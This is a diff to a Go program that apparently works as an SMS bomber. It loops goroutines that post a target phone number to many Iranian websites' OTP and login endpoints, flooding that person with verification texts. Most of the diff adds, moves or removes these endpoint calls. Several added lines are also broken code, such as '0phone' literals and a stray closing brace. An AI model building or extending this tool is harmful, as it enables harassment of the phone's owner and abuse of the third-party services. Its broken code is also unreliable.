@@ -108,6 +108,26 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 /////////////////////////////////////// site aparat should definitely be added.
+		}, ch)  
+		go sms("https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
+			"msisdn": phone,
+		}, ch)  
+		go sms("https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
+			"username": phone,
+		}, ch)   // add site
+		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+			"identifier": 0phone,
+		}, ch)   // add site
+		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+			"'method': 'phone', 'identifier'": 0phone,
+		}, ch)
+		go sms("https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{
+			"cellNumber": phone,
+		}, ch)
+		s38 := fmt.Sprintf("'phone_number':%s,'os_type':'W'", phone)
+		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  
 		go sms("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", map[string]interface{}{
 			"username": phone,
 		}, ch) // add site
@@ -141,15 +161,6 @@ func main() {
 		go sms("https://www.filimo.com/api/fa/v1/user/Authenticate/signup_step1", map[string]interface{}{
 			"account": phone,
 		}, ch)   // add site
-		go sms("https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
-			"username": phone,
-		}, ch)   // add site
-		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-			"identifier": phone,
-		}, ch)   // add site
-		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
-			"phone_number": phone,
-		}, ch)  // add site
 		go sms("https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // add site
@@ -171,12 +182,6 @@ func main() {
 		go sms("https://emp.e-estekhdam.com/users/authenticate/start?redirect=/", map[string]interface{}{
 			"username": phone,
 		}, ch)  // add site
-		go sms("https://cyclops.drnext.ir/v1/website/patients/check-patient-exists-by-mobile?mobile=", map[string]interface{}{
-			"mobile": phone,
-		}, ch)   // add site
-		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
-			"mobile": phone,
-		}, ch)   // add site
 		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)   // add site
@@ -242,9 +247,6 @@ func main() {
 		}, ch)    // add site
 		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)    // add site
-		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
-			"mobile": phone,
 		}, ch)    // add site
 		go sms("https://student.classino.com/otp/v1/api/login", map[string]interface{}{
 			"mobile": phone,
@@ -313,6 +315,19 @@ func main() {
 		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
 			"mobile": phone,
 		}, ch)   // dar khate 764 neveshteh shodeh.
+//number3:
+		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", map[string]interface{}{
+			"cellphone": phone,
+		}, ch)  
+		go sms("https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{
+			"phonenumber": phone,
+		}, ch)  
+		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // add site
+		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
+			"mobile": 0phone,
+		}, ch) 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
@@ -436,9 +451,6 @@ func main() {
 		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
 			"mobileNumber": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-			"'method': 'phone', 'identifier'": phone,
-		}, ch)
 		go sms("https://api.timcheh.com/auth/otp/send", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
@@ -555,9 +567,6 @@ func main() {
 		}, ch)
 		go sms("https://sandbox.sibbazar.com/api/v1/user/invite", map[string]interface{}{
 			"username": phone,
-		}, ch)
-		go sms("https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{
-			"action=newphoneexist&phonenumber=": phone,
 		}, ch)
 		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
 			"mobile": phone,
@@ -701,10 +710,6 @@ func main() {
 		s37 := fmt.Sprintf("againkey=%s&cache=false", phone)
 		go sms("https://moshaveran724.ir/m/pms.php", map[string]interface{}{
 			s37: phone,
-		}, ch)
-		s38 := fmt.Sprintf("'phone_number':%s,'os_type':'W'", phone)
-		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
-			s38: phone,
 		}, ch)
 		s39 := fmt.Sprintf("'userKey':%s,'userKeyType':1", phone)
 		go sms("https://app.flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
